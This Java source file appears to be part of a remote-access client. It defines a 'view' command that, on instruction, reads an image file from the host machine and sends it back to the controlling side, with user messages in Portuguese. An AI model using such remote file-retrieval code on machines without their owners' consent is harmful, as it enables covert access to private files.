package br.com.introcdc.connect.client.commands.file.navigation;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:37
 */

import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.client.components.ImageComponents;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class ClientCommandView extends ClientCommand {

    public ClientCommandView() {
        super("view");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }
        File file = FileComponents.file(input);
        if (!file.exists() || file.isDirectory()) {
            msg("Arquivo não encontrado!");
            return;
        }
        String name = file.getName().toLowerCase();
        if (!name.endsWith(".png") && !name.endsWith(".jpg") && !name.endsWith(".jpeg") && !name.endsWith(".webp") && !name.endsWith(".bmp") && !name.endsWith(".gif")) {
            msg("Formato de arquivo inválido!");
            return;
        }

        msg("Enviando visualização do arquivo " + file.getName() + "...");
        msg("view-image");
        BufferedImage image = ImageIO.read(file);
        ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> ImageComponents.sendImage(5, image)).start(), 1, TimeUnit.SECONDS);
    }

}
